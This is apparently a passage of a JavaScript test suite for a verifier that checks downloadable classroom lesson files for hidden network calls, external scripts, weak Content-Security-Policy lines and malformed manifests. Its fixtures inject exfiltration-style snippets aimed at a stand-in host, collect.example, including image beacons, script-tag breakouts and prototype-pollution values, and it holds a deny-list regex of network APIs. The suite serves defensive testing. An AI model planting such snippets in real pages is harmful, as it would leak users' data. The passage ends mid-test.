    expect([deliberate.script.verdict, deliberate.headline]).toEqual(['agree', look(2)]);
    expect(ids(deliberate)).toEqual(['claim-network', 'fetch']);
    const found = odd(deliberate).find((f) => f.id === 'fetch');
    expect([found.cls, found.where, found.line]).toEqual([UNEXPECTED, 'the code', F.practice.split('\nvar renders=')[0].split('\n').length + 1]);
    expect(found.why).toBe('This call sends or fetches data over the network. A file with no class mailbox has none. The policy would refuse it.');
    expect(found.excerpt).toContain('win.fetch("collect"');
    // In a file with a class mailbox the first call is the mailbox's own. A second one is not.
    const second = verify.verifyPacket(reseal(withCode(F.mailbox, line)));
    expect(odd(second).map((f) => [f.id, f.why])).toEqual([['fetch', 'A file with a class mailbox has one call that sends. This is another.']]);
  });

  it('an external <script src>: found, though the hash of the real script still matches', () => {
    const r = verify.verifyPacket(F.practice.replace('<script>', '<script src="https://collect.example/a.js"></script><script>'));
    expect([r.script.verdict, r.headline]).toEqual(['agree', look(1)]);
    expect(odd(r).map((f) => [f.id, f.cls, f.where])).toEqual([['external', UNEXPECTED, 'the page markup']]);
    const beside = verify.verifyPacket(F.practice.replace('<script>', '<script src="more.js"></script><script>'));
    expect(odd(beside).map((f) => [f.id, f.why])).toEqual([['script-file', "A script is loaded from more.js. A packet's one script is written inside the file."]]);
  });

  it('a <form action>: found', () => {
    const r = verify.verifyPacket(F.practice.replace('<p id="live"', '<form action="https://collect.example/f" method="post"><input name="q"></form><p id="live"'));
    expect(r.result).toBe('look');
    expect(ids(r)).toEqual(['external', 'form', 'markup-element']);
    expect(ids(verify.verifyPacket(F.practice.replace('<p id="live"', '<form action="send.html"></form><p id="live"')))).toEqual(['form', 'markup-points']);
  });

  it('an absolute address in the data block: found, with the hashes made to match', () => {
    const r = verify.verifyPacket(reseal(changed(F.practice, DATA, DATA + ',"more":"https://collect.example/x?d="')));
    expect([r.script.verdict, r.headline]).toEqual(['agree', look(1)]);
    expect(odd(r).map((f) => [f.id, f.cls, f.where, f.excerpt])).toEqual([['address', UNEXPECTED, 'the data block', 'https://collect.example/x?d=']]);
    expect(odd(r)[0].why).toBe('A packet holds no web address. It is in the data block. The policy stops code from connecting to it, but a link or a change of address could still open it.');
    for (const address of ['//collect.example/x', 'wss://collect.example', 'HTTP://COLLECT.EXAMPLE']) {
      expect(ids(verify.verifyPacket(reseal(changed(F.practice, DATA, DATA + ',"more":"' + address + '"')))), address).toEqual(['address']);
    }
  });

  it('the manifest says it connects to nothing while the policy names a host: the two are set side by side', () => {
    const r = verify.verifyPacket(changed(F.mailbox, /"network":\{[^}]*\}/.exec(F.mailbox)[0], '"network":"none"'));
    expect([r.script.verdict, r.result, r.headline]).toEqual(['agree', 'look', look(1)]);
    expect(odd(r).map((f) => [f.id, f.cls])).toEqual([['claim-network', UNEXPECTED]]);
    expect(odd(r)[0].why).toBe('The file says: it connects to nothing. The policy lets the file connect to: https://script.google.com, https://script.googleusercontent.com.');
    expect(verdicts(r).network).toBe('differs');
    // The other way round: a practice file's policy opened to the mailbox hosts, with no mailbox in its data.
    const opened = verify.verifyPacket(changed(F.check, "connect-src 'none'", 'connect-src https://script.google.com https://script.googleusercontent.com'));
    expect(opened.result).toBe('look');
    expect(ids(opened)).toContain('mailbox-data');
    expect(opened.headline).not.toBe(ONE_PLACE);
  });

  it('other ways out: a change of address, a picture that carries data, a refresh, code in an attribute', () => {
    const cases = [
      [reseal(withCode(F.practice, 'win.location = "collect.html?" + encodeURIComponent(JSON.stringify(lesson));')), ['location']],
      [reseal(withCode(F.practice, 'win.open("collect.html");')), ['open']],
      [reseal(changed(withCode(F.practice, 'new Image().src = "//collect.example/p?d=" + 1;'), 'img-src data:', 'img-src data: https:')), ['external', 'policy-load']],
      [F.practice.replace('<meta name="generator"', '<meta http-equiv="refresh" content="5;url=//collect.example/"><meta name="generator"'), ['address', 'refresh']],
      [F.practice.replace('<body>', '<body onload="go()">'), ['markup-handler']],
      [F.practice.replace('<p id="live"', '<img src="p.png"><p id="live"'), ['markup-element', 'markup-points']],
      [F.practice.replace('<p id="live"', '<a href="https://collect.example">Go</a><p id="live"'), ['external', 'markup-element']],
      [reseal(withCode(F.practice, 'eval("1");')), ['eval']],
      [reseal(withCode(F.practice, 'doc.cookie = "a=1";')), ['claim-never-cookies', 'claim-stores', 'cookie']],
      [reseal(withCode(F.practice, 'win.sessionStorage.setItem("x", "1");')), ['claim-stores', 'other-storage']],
      [reseal(withCode(F.practice, 'win.localStorage.setItem("another", "1");')), ['claim-stores', 'local-storage']],
      [reseal(withCode(F.practice, 'win.navigator.mediaDevices.getUserMedia({ audio: true });')), ['claim-never-camera', 'claim-never-microphone', 'microphone']],
      [reseal(changed(F.practice, "script-src 'sha256-", "script-src 'unsafe-eval' 'sha256-")), ['policy-builds']],
      [reseal(changed(F.practice, "form-action 'none'; base-uri 'none'; ", '')), ['policy-base', 'policy-forms']],
    ];
    for (const [html, want] of cases) {
      const r = verify.verifyPacket(html);
      expect(ids(r), want.join(' + ')).toEqual(want);
      expect(r.headline, want.join(' + ')).toBe(look(want.length));
    }
  });

  it('a policy that is missing, late, doubled or unpinned is said to be so', () => {
    const policyTag = /<meta http-equiv="Content-Security-Policy" content="[^"]*">/.exec(F.practice)[0];
    const none = verify.verifyPacket(F.practice.replace(policyTag, ''));
    expect(ids(none)).toEqual(['claim-network', 'claim-never-internet', 'claim-policy', 'hash', 'no-policy']);
    expect(none.policy.facts[0].answer).toBe('Yes. The file has no policy line, so nothing stops its code from connecting to any address.');
    expect(none.plain.reach[0]).toBe('It has no policy line, so nothing stops its code from connecting to any address.');
    const late = verify.verifyPacket(F.practice.replace(policyTag, '').replace('<title>', '<style>p{}</style>' + policyTag + '<title>'));
    expect(odd(late).map((f) => [f.id, f.why])).toEqual([['policy-late', 'The policy line comes after <style>. A browser applies a policy only to what follows it, and only from the head of the file.']]);
    const inBody = verify.verifyPacket(F.practice.replace(policyTag, '').replace('<main>', policyTag + '<main>'));
    expect(ids(inBody)).toContain('policy-late');
    const twice = verify.verifyPacket(F.practice.replace(policyTag, policyTag + policyTag.replace("connect-src 'none'", 'connect-src *')));
    expect(ids(twice)).toEqual(['policy-twice']);
    const unpinned = verify.verifyPacket(changed(F.practice, /script-src 'sha256-[^']+'/.exec(F.practice)[0], "script-src 'unsafe-inline'"));
    expect(ids(unpinned)).toEqual(['hash', 'policy-unpinned']);
    // One stray letter before the policy line ends the head of a page: a browser then ignores the policy. A comment does not.
    const stray = verify.verifyPacket(changed(F.practice, '<head>', '<head>x'));
    expect(odd(stray).map((f) => [f.id, f.cls, f.why])).toEqual([['policy-late', UNEXPECTED, 'There is text before the policy line that is not inside a tag. A browser then takes the policy line to be part of the page body, where a policy is ignored.']]);
    expect(ids(verify.verifyPacket(changed(F.practice, '<!doctype html>', 'x<!doctype html>')))).toEqual(['policy-late']);
    expect(verify.verifyPacket(changed(F.practice, '<head>', '<head><!-- a note --> \n')).headline).toBe(CLOSED);
    // A browser does not take http-equiv with a space in front of it for a policy line. Neither does this page.
    const spaced = verify.verifyPacket(changed(F.practice, 'http-equiv="Content-Security-Policy"', 'http-equiv=" Content-Security-Policy"'));
    expect(spaced.policy.found).toBe(false);
    expect(ids(spaced)).toEqual(expect.arrayContaining(['no-policy', 'meta-other']));
    expect(verify.verifyPacket(changed(F.practice, 'http-equiv="Content-Security-Policy"', 'HTTP-EQUIV=content-security-POLICY')).headline).toBe(CLOSED);
    // A browser skips a line of a policy that holds a character outside plain ASCII; an entity may be read as another character.
    for (const extra of [String.fromCharCode(233), '&#59;', String.fromCharCode(0x3000)]) {
      expect(ids(verify.verifyPacket(F.practice.replace("default-src 'none';", "default-src 'none' " + extra + ';'))), extra).toContain('policy-code');
    }
    // A second line with the same name is ignored by a browser, and is pointed out here.
    const repeated = verify.verifyPacket(F.practice.replace("connect-src 'none'\">", "connect-src 'none'; connect-src *\">"));
    expect(ids(repeated)).toEqual(['claim-policy', 'policy-repeat']);
    expect(repeated.policy.facts[0].open).toBe(false);
    // A line that overrides script-src for script elements is read as a browser reads it.
    const elem = verify.verifyPacket(F.practice.replace("connect-src 'none'\">", "connect-src 'none'; script-src-elem https://collect.example\">"));
    expect(ids(elem)).toContain('policy-load');
    expect(elem.policy.facts.find((row) => row.id === 'scripts').answer).toBe('Yes: from https://collect.example.');
  });

  it('a manifest that does not match its file: another id, another storage name, a teacher code that is not there', () => {
    const m = manifestOf(F.check);
    const otherName = verify.verifyPacket(changed(F.check, '"key":"' + m.stores[0].key + '"', '"key":"alloflow-take-home:other:r1"'));
    expect(odd(otherName).map((f) => [f.id, f.cls])).toEqual([['claim-stores', UNEXPECTED]]);
    expect(otherName.claims.find((row) => row.id === 'stores').shows).toBe('The code stores under the name ' + m.stores[0].key + '.');
    const otherId = verify.verifyPacket(changed(F.check, '"packet":{"id":"' + m.packet.id + '"', '"packet":{"id":"math-other"'));
    expect(odd(otherId).map((f) => [f.id, f.cls])).toEqual([['claim-identity', LOOK]]);
    const saysCode = verify.verifyPacket(changed(F.check, '"teacherCode":"none"', '"teacherCode":"set; kept only as a salted SHA-256 hash (2000 rounds)"'));
    expect(odd(saysCode).map((f) => [f.id, f.cls])).toEqual([['claim-teacher-code', LOOK]]);
    const noHash = verify.verifyPacket(changed(F.check, /"scriptSha256":"[0-9a-f]+"/.exec(F.check)[0], '"scriptSha256":""'));
    expect([noHash.script.verdict, noHash.script.note]).toEqual(['differs', 'The script matches the hash in the policy, but the manifest names another.']);
  });
});

// ---------------------------------------------------------------------------
// Part 3: hostile files, and files that are not packets
// ---------------------------------------------------------------------------
describe('files that are not what they seem', () => {
  it('a 5 MB file of junk is read to the end, quickly, and is not a packet', () => {
    const junk = new Uint8Array(5 * 1024 * 1024);
    for (let i = 0; i < junk.length; i++) junk[i] = (Math.imul(i, 2654435761) >>> 24) & 255;
    const started = Date.now();
    const r = verify.verifyPacket(junk);
    expect(Date.now() - started).toBeLessThan(20000);
    expect([r.ok, r.kind, r.result, r.headline]).toEqual([true, 'not_packet', 'not_packet', '']);
    expect(r.why).toBe('This is not an AlloFlow packet: it has no manifest block (the part of a packet that says what the file is), and it is not an older AlloFlow practice file.');
    expect(r.fingerprint.sha256).toBe(createHash('sha256').update(junk).digest('hex'));
    // 5 MB of opening tags, and a real packet with 4 MB of tags after it: both end.
    expect(verify.verifyPacket('<b>'.repeat(1700000)).kind).toBe('not_packet');
    const padded = verify.verifyPacket(F.check.replace('</body>', '<i>'.repeat(1400000) + '</body>'));
    expect([padded.kind, padded.result]).toEqual(['packet', 'look']);
    expect(ids(padded)).toContain('markup-odd');
    expect(padded.findings.length).toBeLessThan(120);
  });

  it('a file over 60 MB is refused before it is read, with a plain reason', () => {
    expect(verify.MAX_BYTES).toBe(60 * 1024 * 1024);
    const r = verify.verifyPacket({ byteLength: verify.MAX_BYTES + 1 });
    expect([r.ok, r.refused, r.result, r.headline, r.kind]).toEqual([false, 'too_big', 'refused', '', 'not_packet']);
    expect(r.why).toBe('This file is 60 MB. A file larger than 60 MB is not read. A practice file is usually a few megabytes.');
    expect(verify.refusal('too_big', 250 * 1024 * 1024).why).toBe('This file is 250 MB. A file larger than 60 MB is not read. A practice file is usually a few megabytes.');
    expect([verify.verifyPacket('').refused, verify.verifyPacket(new Uint8Array(0)).why]).toEqual(['empty', 'This file is empty.']);
    for (const nothing of [null, undefined, 7, {}, []]) expect(verify.verifyPacket(nothing).refused, String(nothing)).toBe('unreadable');
    expect(verify.reportText(r, { product: NAME, file: 'big.html' })).toContain('Result: This file is 60 MB.');
  });

  it('a closing script tag hidden in a string ends the script where a browser ends it', () => {
    const r = verify.verifyPacket(withCode(F.practice, 'var trick = "</script><script src=//collect.example/a.js></script>";'));
    expect(r.result).toBe('look');
    expect(ids(r)).toEqual(expect.arrayContaining(['external', 'hash']));
    // The hash is of the script up to the first closing tag, which is what a browser would hash.
    expect(r.script.sha256).toBe(sha(/<script>([\s\S]*?)<\/script>/.exec(withCode(F.practice, 'var trick = "</script><script src=//collect.example/a.js></script>";'))[1]));
    // The same text made harmless by the loader's own escaping changes nothing but the hash.
    const escaped = verify.verifyPacket(reseal(withCode(F.practice, 'var harmless = "\\u003c/script>";')));
    expect([escaped.headline, escaped.script.verdict]).toEqual([CLOSED, 'agree']);
    // "<script" as text inside the script, and a comment mark inside it, are pointed out.
    expect(ids(verify.verifyPacket(reseal(withCode(F.practice, 'var a = "<script>";'))))).toEqual(['script-written']);
    expect(ids(verify.verifyPacket(reseal(withCode(F.practice, 'var a = "<!--";'))))).toEqual(['script-comment']);
    // A script hidden in a comment does not count as a script, and is still seen as text.
    const commented = verify.verifyPacket(F.practice.replace('<script>', '<!-- <script src="//collect.example/a.js"></script> --><script>'));
    expect([commented.script.count, commented.script.verdict]).toEqual([1, 'agree']);
    expect(ids(commented)).toEqual(['external', 'script-written']);
  });

  it('an HTML page that is not a packet gets a plain reason and no headline', () => {
    const page = '<!doctype html><html><head><title>Short vowels</title></head><body><h1>Short vowels</h1><script>alert(1)</script></body></html>';
    const r = verify.verifyPacket(page);
    expect([r.ok, r.kind, r.result, r.headline, r.findings, r.claims]).toEqual([true, 'not_packet', 'not_packet', '', [], []]);
    expect(r.why).toBe('This is not an AlloFlow packet: it has no manifest block (the part of a packet that says what the file is), and it is not an older AlloFlow practice file.');
    expect(r.plain).toEqual({ about: [], reach: [], keeps: [], saves: [], look: [] });
    expect(verify.verifyPacket(read('packets.html')).kind).toBe('not_packet');
    // A page that only names itself a packet is not one.
    const named = verify.verifyPacket(page.replace('<script>', '<script type="application/json" id="packet-manifest">{"kind":"something-else"}</script><script>'));
    expect(named.why).toBe('This is not an AlloFlow packet: it has a block named packet-manifest, but the block does not say it is a packet.');
    // The files a teacher is most likely to drop here by mistake.
    const results = 'This looks like a results file, not a packet. The page named Add up results reads results files.';
    expect(verify.verifyPacket(read('tests/fixtures/packets_results/sample_results.csv')).why).toBe(results);
    expect(verify.verifyPacket(read('tests/fixtures/packets_results/sample_results.json')).why).toBe(results);
    expect(verify.verifyPacket('Just some words.').why).toBe('This is not an AlloFlow packet: it is not a web page file.');
    const utf16 = new Uint8Array(Buffer.concat([Buffer.from([0xFF, 0xFE]), Buffer.from(F.check, 'utf16le')]));
    expect(verify.verifyPacket(utf16).why).toBe('This is not an AlloFlow packet: the file is not UTF-8 text.');
  });

  it('a packet with two script blocks is not passed', () => {
    const r = verify.verifyPacket(F.practice.replace('</body>', '<script>window.more = 1;</script></body>'));
    expect([r.script.count, r.script.verdict, r.headline]).toEqual([2, 'agree', look(1)]);
    expect(odd(r).map((f) => [f.id, f.cls, f.why])).toEqual([['script-many', UNEXPECTED, 'The file has 2 scripts that can run. A packet has exactly one.']]);
    const data = verify.verifyPacket(F.practice.replace('</body>', '<script type="application/json">{"a":1}</script></body>'));
    expect(ids(data)).toEqual(['script-data']);
    // A manifest block that is not marked as data would run as code.
    const runs = verify.verifyPacket(changed(F.practice, '<script type="application/json" id="packet-manifest">', '<script id="packet-manifest">'));
    expect(ids(runs)).toEqual(expect.arrayContaining(['manifest-type', 'script-many']));
  });

  it('a manifest that cannot be read, or that holds hostile values, does no harm', () => {
    const block = /<script type="application\/json" id="packet-manifest">(.*?)<\/script>/.exec(F.check)[1];
    const broken = verify.verifyPacket(F.check.replace(block, () => block.slice(0, -1)));
    expect([broken.kind, broken.manifest.readable, broken.result]).toEqual(['packet', false, 'look']);
    expect(ids(broken)).toContain('manifest-unreadable');
    expect(verify.verifyPacket(F.check.replace(block, () => '[1,2]')).manifest.error).toBe('The manifest block does not hold a list of named facts.');
    // Values of the wrong kind, a very long title, and names that mean something to JavaScript.
    const m = { ...manifestOf(F.check), title: 'T'.repeat(200000), stores: 'none', saves: { length: 3 }, never: [{ toString: 1 }, null, 'AI'], network: { sendsTo: ['x'] }, attributions: [null, 5, 'A credit'], check: { teacherCode: {}, answers: 7 }, builder: 'me' };
    const hostile = JSON.stringify(m).replace(/</g, '\\u003c').replace('"kind"', '"__proto__":{"polluted":true},"constructor":null,"kind"');
    const text = F.check.replace(block, () => hostile);
    const odd2 = verify.verifyPacket(text);
    expect(odd2.kind).toBe('packet');
    expect(odd2.identity.title.length).toBeLessThan(260);
    expect({}.polluted).toBeUndefined();
    expect(verify.reportText(odd2, {}).length).toBeLessThan(40000);
    expect(odd2.claims.find((row) => row.id === 'credits').says).toBe('5; A credit');
    // A lesson block of the wrong kind.
    const noLesson = verify.verifyPacket(reseal(changed(F.check, /var lesson=\{.*\};\nvar labels=/.exec(F.check)[0], 'var lesson=[1,2];\nvar labels=')));
    expect(ids(noLesson)).toContain('data-block');
    expect(noLesson.data).toBeNull();
  });

  it('a file with thousands of one construct is counted to the end and listed in part', () => {
    const r = verify.verifyPacket(reseal(withCode(F.check, 'fetch(1);'.repeat(30000))));
    expect(r.counts.notExpected).toBe(30001);
    expect(r.headline).toBe(look(30001));
    expect(r.findings.filter((f) => f.id === 'fetch').length).toBe(40);
    expect(r.findings.length).toBeLessThan(60);
    expect(r.plain.look.length).toBe(31);
    expect(r.plain.look[30]).toBe('And 29971 more.');
    expect(verify.reportText(r, {})).toContain('- and ' + (r.counts.places - r.findings.length) + ' more places of kinds already listed.');
    expect(r.counts.places - r.findings.length).toBeGreaterThan(29000);
  });
});

describe('files changed at random', () => {
  // The same numbers on every run.
  let seed = 20261111;
  const next = (n) => { seed = (Math.imul(seed, 1664525) + 1013904223) >>> 0; return seed % n; };

  it('one character changed anywhere in the script never leaves the first or the second headline standing', () => {
    for (const html of [F.practice, F.check, F.mailbox]) {
      const from = html.indexOf('<script>') + 8, to = html.indexOf('</script>', from);
      for (let i = 0; i < 80; i++) {
        const at = from + next(to - from);
        const other = html[at] === 'x' ? 'y' : 'x';
        const r = verify.verifyPacket(html.slice(0, at) + other + html.slice(at + 1));
        expect(r.result, 'character ' + at).toBe('look');
        expect(r.script.verdict, 'character ' + at).toBe('differs');
      }
    }
  });

  it('pieces cut out, doubled, moved and broken, 300 times: the checks always end, and always give one of the results', () => {
    const sources = [F.practice, F.check, F.mailbox, F.older];
    const breakers = ['<', '>', '"', "'", '</script>', '<script>', '<!--', '-->', '<plaintext>', '<meta http-equiv="Content-Security-Policy" content="', String.fromCharCode(0), '&#', '{', '}]'];
    const seen = new Set();
    for (let i = 0; i < 300; i++) {
      let html = sources[i % sources.length];
      for (let k = 0; k <= i % 3; k++) {
        const at = next(html.length), size = next(i % 2 ? 4000 : 40) + 1, kind = next(4);
        const piece = html.slice(at, at + size);
        if (kind === 0) html = html.slice(0, at) + html.slice(at + size);
        else if (kind === 1) html = html.slice(0, at) + piece + piece + html.slice(at + size);
        else if (kind === 2) html = html.slice(0, at) + html.substr(next(html.length), size) + html.slice(at);
        else html = html.slice(0, at) + breakers[next(breakers.length)] + html.slice(at);
      }
      const r = verify.verifyPacket(html);
      expect(['closed', 'mailbox', 'look', 'not_packet'], 'run ' + i).toContain(r.result);
      expect([CLOSED, ONE_PLACE, look(r.counts.notExpected + r.counts.look), ''], 'run ' + i).toContain(r.headline);
      expect(r.headline === '', 'run ' + i).toBe(r.result === 'not_packet');
      expect(verify.reportText(r, { product: NAME, file: 'x.html', when: 'now' }).length, 'run ' + i).toBeGreaterThan(100);
      seen.add(r.result);
    }
    expect(seen.has('look')).toBe(true);
  });
});

// ---------------------------------------------------------------------------
// Part 4: the new files as text
// ---------------------------------------------------------------------------
const parse = (file) => new JSDOM(read(file)).window.document;
const addresses = (text) => text.match(/(?:https?:|wss?:)?\/\/[a-z0-9.-]+\.[a-z]{2,}[^\s"'<>)]*/gi) || [];

describe('the pages as files', () => {
  it('carry the rule that refuses every connection, before anything is loaded', () => {
    for (const file of [PAGE, GUIDE]) {
      const doc = parse(file);
      const meta = doc.querySelector('meta[http-equiv="Content-Security-Policy"]');
      expect(meta.getAttribute('content'), file).toBe(CSP);
      const head = [...doc.head.children];
      expect(head.slice(0, head.indexOf(meta)).every((node) => node.tagName === 'META'), file).toBe(true);
      expect(doc.querySelector('meta[name="referrer"]').getAttribute('content'), file).toBe('no-referrer');
    }
    expect(CSP).toContain("connect-src 'none'");
    expect(CSP).not.toMatch(/unsafe|\*|blob:|data:|https?:/);
    // The checker reads its own kind of rule: this page's rule lets it connect to nothing.
    expect(verify.verifyPacket(read(PAGE)).kind).toBe('not_packet');
  });

  it('have no inline script, no inline style and no inline handler', () => {
    for (const file of [PAGE, GUIDE]) {
      const doc = parse(file);
      expect(doc.querySelectorAll('style').length, file).toBe(0);
      for (const script of doc.querySelectorAll('script')) {
        expect(script.getAttribute('src'), file).toMatch(/^(?:packets_samples\/)?[\w.-]+\.js$/);
        expect(script.textContent.trim(), file).toBe('');
        expect(script.hasAttribute('defer'), file).toBe(true);
      }
      for (const node of doc.querySelectorAll('*')) {
        for (const attribute of node.attributes) {
          expect(/^on|^style$/i.test(attribute.name), file + ' ' + node.tagName + ' ' + attribute.name).toBe(false);
          expect(/^\s*javascript:/i.test(attribute.value), file).toBe(false);
        }
      }
    }
    expect(read(STYLES)).not.toMatch(/@import|url\(|@font-face|expression\(/i);
  });

  it('the page script never builds markup from text, and makes only elements it names itself', () => {
    const script = read(SCRIPT);
    expect(script).not.toMatch(/innerHTML|outerHTML|insertAdjacentHTML|document\.write|DOMParser|createContextualFragment|parseFromString|srcdoc|\.cssText|setAttribute\(\s*'style'|\beval\s*\(|new\s+Function|setTimeout\s*\(\s*['"]/);
    // One place makes elements, and every call names its tag as a plain word: nothing from a file can choose one.
    expect(script.match(/createElement(?:NS)?\(/g)).toEqual(['createElement(']);
    expect(script).toContain('var node = doc.createElement(tag);');
    const made = [...script.matchAll(/\bel\(([^,)]*)/g)].map((m) => m[1]);
    expect(made.every((arg) => /^'[a-z0-9]+'$/.test(arg)), made.filter((arg) => !/^'[a-z0-9]+'$/.test(arg)).join(' ')).toBe(true);
    expect([...new Set(made.map((arg) => arg.slice(1, -1)))].sort()).toEqual(['article', 'button', 'code', 'dd', 'details', 'div', 'dl', 'dt', 'h3', 'h4', 'li', 'p', 'span', 'strong', 'summary', 'table', 'tbody', 'td', 'textarea', 'th', 'thead', 'tr', 'ul']);
    // What is set on an element: text, a class, and a few fixed attributes. Never a link, a source or a handler.
    expect([...new Set([...script.matchAll(/setAttribute\('([^']+)'/g)].map((m) => m[1]))].sort()).toEqual(['aria-label', 'aria-labelledby', 'data-copy', 'data-label', 'data-print', 'data-result', 'role']);
    expect(script).not.toMatch(/\.(?:href|src|action|srcset|data)\s*=[^=]/);
    expect([...script.matchAll(/\w+\.on[a-z]+(?=\s*=[^=])/g)].map((m) => m[0])).toEqual(['fileReader.onload', 'fileReader.onerror']);
  });

  it('call nothing that could reach a network or keep anything, and name no web address but the ones listed', () => {
    const script = read(SCRIPT);
    expect(script).not.toMatch(/\bfetch\b|XMLHttpRequest|WebSocket|EventSource|sendBeacon|\bimport\s*\(|\.\s*cookie\b|getUserMedia|serviceWorker|RTCPeerConnection|indexedDB|localStorage|sessionStorage|\.src\s*=|window\.open|location\s*\.\s*(?:href|assign|replace)|postMessage|importScripts|createObjectURL/);
    // The checks know these words only as things to look for: nothing there calls them, and nothing there touches a page.
    const checksText = read(CORE);
    expect(checksText).not.toMatch(/new\s+XMLHttpRequest|new\s+WebSocket|new\s+EventSource|\.sendBeacon\s*\(|\b(?:localStorage|sessionStorage)\s*\.\s*\w|\.\s*cookie\s*=|\brequire\s*\(|^\s*import\s/m);
    expect(checksText).not.toMatch(/createElement|appendChild|querySelector|getElementById|DOMParser|\.textContent|\.innerHTML\s*=/);
    expect([...new Set(checksText.match(/\broot\.\w+/g))].sort()).toEqual(['root.AlloPacketVerify', 'root.TextDecoder', 'root.TextEncoder']);
    const allowed = { [GUIDE]: [REPOSITORY], [CORE]: ['https://script.google.com', 'https://script.googleusercontent.com'] };
    for (const file of WRITTEN) expect(addresses(read(file)), file).toEqual(allowed[file] || []);
    // The one link out is the public source code, the address packets.html and index.html already link.
    expect(read('packets.html')).toContain('href="' + REPOSITORY + '" rel="noopener noreferrer"');
    const link = parse(GUIDE).querySelector('a[href^="http"]');
    expect([link.getAttribute('href'), link.getAttribute('rel'), link.textContent]).toEqual([REPOSITORY, 'noopener noreferrer', 'AlloFlow on GitHub']);
    expect(parse(GUIDE).querySelectorAll('a[href^="http"]').length).toBe(1);
    expect(read(PAGE) + read(GUIDE)).not.toMatch(/shared\.css|site\.js|lucide|fonts\.g|unpkg|promo/i);
  });

  it('the checks run with no page at all', () => {
    // Loaded where there is no window and no document: the report is the same.
    const box = { TextEncoder, TextDecoder, module: { exports: {} } };
    runInNewContext(read(CORE), box);
    const alone = box.module.exports.verifyPacket(F.check);
    expect(JSON.parse(JSON.stringify(alone))).toEqual(JSON.parse(JSON.stringify(verify.verifyPacket(F.check))));
    expect(Object.keys(box).sort()).toEqual(['AlloPacketVerify', 'TextDecoder', 'TextEncoder', 'module']);
    // With no way to turn bytes into text, it says so.
    const bare = { module: { exports: {} } };
    runInNewContext(read(CORE).replace(/typeof Text(?:En|De)coder !== 'undefined'/g, 'false'), bare);
    expect(bare.module.exports.verifyPacket('x').why).toBe('This browser cannot turn the file into text, so the file was not read.');
  });

  it('refer only to local files that exist, and say exactly which files they load', () => {
    const want = {
      [PAGE]: { loaded: ['packets-mark.svg', 'packets.css', STYLES, 'packets-page.js', CORE, ...SAMPLE_FILES, SCRIPT], says: 'This page loads ten files, all from this site' },
      [GUIDE]: { loaded: ['packets-mark.svg', 'packets.css', STYLES, 'packets-page.js'], says: 'This page loads five files, all from this site' },
    };
    for (const file of [PAGE, GUIDE]) {
      const doc = parse(file);
      const loaded = [];
      for (const node of doc.querySelectorAll('[href], [src]')) {
        const address = node.getAttribute('href') || node.getAttribute('src');
        if (address === REPOSITORY) continue;
        expect(address, file).toMatch(/^(?:#[\w-]+|\.\/|[\w.-]+(?:\/[\w.-]+)*(?:#[\w-]+)?)$/);
        if (address.startsWith('#')) expect(doc.getElementById(address.slice(1)), address).toBeTruthy();
        else expect(existsSync(address === './' ? 'index.html' : address.replace(/#.*$/, '')), address).toBe(true);
        if (node.tagName !== 'A') loaded.push(address);
      }
      expect(loaded, file).toEqual(want[file].loaded);
      const said = [...doc.querySelectorAll('details.proof li')].find((item) => item.textContent.startsWith('This page loads'));
      expect(said.textContent, file).toContain(want[file].says);
      expect([...said.querySelectorAll('code')].map((node) => node.textContent), file).toEqual(loaded.filter((name) => /\.(?:css|js)$/.test(name)));
      expect(loaded.length + 1).toBe({ ten: 10, five: 5 }[/loads (\w+) files/.exec(said.textContent)[1]]);
    }
    for (const quoted of read(SCRIPT).match(/'[\w./-]+\.(?:json|html|js|css|svg)'/g) || []) expect(existsSync(quoted.slice(1, -1)), quoted).toBe(true);
  });

  it('state, always in view, what the page does with a file and what it cannot tell', () => {
    const doc = parse(PAGE);
    const proof = doc.querySelector('details.proof');
    expect(proof.hasAttribute('open')).toBe(false);
    expect([...proof.querySelectorAll('summary span')].map((node) => node.textContent)).toEqual([PROOF_LINE, 'See the details', 'Hide the details']);
    const items = [...proof.querySelectorAll('li')].map((item) => item.textContent);
    expect(items.slice(0, 5)).toEqual([
      "The file you choose is read with the browser's own file reader. What is in it stays in this tab.",
      'The file is read as text. It is never run, and nothing in it is added to this page as markup: what you see from the file is shown as plain text.',
      'Nothing is sent. This page cannot connect to anything: the rule below tells the browser to refuse every connection, and the browser enforces it.',
      'This page runs without AI. It reads, counts and compares what is in the file, and nothing else.',
      'Nothing is kept on this device. There are no cookies, there is no storage, and there is nothing to sign in to. Closing the tab clears the page.']);
    expect(proof.querySelector('[data-show-rule]')).toBeTruthy();
    // The limits are not behind a button: they are on the page before any report, in the words the checks also use.
    const limits = doc.getElementById('limits');
    expect(limits.textContent).toBe(LIMITS);
    expect(verify.LIMITS).toBe(LIMITS);
    expect(limits.closest('details, [hidden]')).toBeNull();
    expect(read(SCRIPT)).toMatch(/new FileReader\(\)/);
    expect(read(SCRIPT)).toMatch(/readAsArrayBuffer\(file\)/);
    // The three headlines are written once, in the checks.
    expect([verify.HEADLINE.closed, verify.HEADLINE.mailbox('script.google.com'), verify.HEADLINE.look(1), verify.HEADLINE.look(3)]).toEqual([CLOSED, ONE_PLACE, look(1), look(3)]);
    expect(verify.CLASSES).toEqual([EXPECTED, UNEXPECTED, LOOK]);
    expect(verify.VERDICTS).toEqual(['agree', 'differs', 'cannot tell']);
  });

  it('say "AI" only to say that none runs here', () => {
    const allowed = { [PAGE]: ['This page runs without AI.', 'This page runs without AI.', 'Runs without AI.'], [GUIDE]: ['This page runs without AI.', 'Runs without AI.'] };
    const sentences = (text) => text.replace(/\s+/g, ' ').trim().split(/(?<=[.!?])\s+/).filter((sentence) => /\bAI\b/.test(sentence));
    const BLOCK = 'title, h1, h2, h3, p, li, span, legend, label, button, option, td, th';
    for (const file of [PAGE, GUIDE]) {
      const doc = parse(file);
      const blocks = [...doc.querySelectorAll(BLOCK)].filter((node) => !node.querySelector(BLOCK));
      const found = blocks.flatMap((node) => sentences(node.textContent)).concat(sentences(doc.querySelector('meta[name="description"]').getAttribute('content')));
      expect(found, file).toEqual(allowed[file]);
    }
    // In the checks the word appears where a file's own statement is read ("never: AI") and in one sentence about a builder.
    expect(read(SCRIPT) + read(STYLES)).not.toMatch(/\bAI\b/);
    const lines = read(CORE).split('\n').filter((line) => /\bAI\b/.test(line));
    expect(lines.length).toBe(2);
    expect(lines[0].trim()).toBe("else if (thing === 'AI') {");
    expect(lines[1]).toContain("', which says it runs without AI'");
    expect(WRITTEN.map(read).join('\n')).not.toMatch(/no AI\b|Gemini|ChatGPT|chatbot|generat(?:es|ive)|\bLLM\b/i);
  });

  it('promise nothing: no "safe", no "secure", no "guaranteed", no "certified", no "compliant"', () => {
    for (const file of WRITTEN) {
